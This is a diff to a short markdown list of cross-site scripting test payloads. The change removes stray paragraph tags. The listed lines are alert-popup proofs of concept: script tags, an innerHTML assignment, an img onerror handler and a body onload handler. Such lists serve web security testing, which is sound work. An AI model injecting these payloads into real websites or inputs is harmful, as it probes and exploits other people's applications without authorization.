@@ -1,6 +1,6 @@
 # Payloads
 ## XXS Popup:
-<p>
+
 - <script>alert("XSS");</script>
 - <script>alert(‘XSS’);</script>
 - <script>alert(‘XSS’)</script>
@@ -17,4 +17,3 @@
 - div.innerHTML = '<script deferred>alert("XSS");</script>';
 - <img src="aaa" onerror=alert('xxs')>
 - <body onload="alert('XSS')">
-</p>
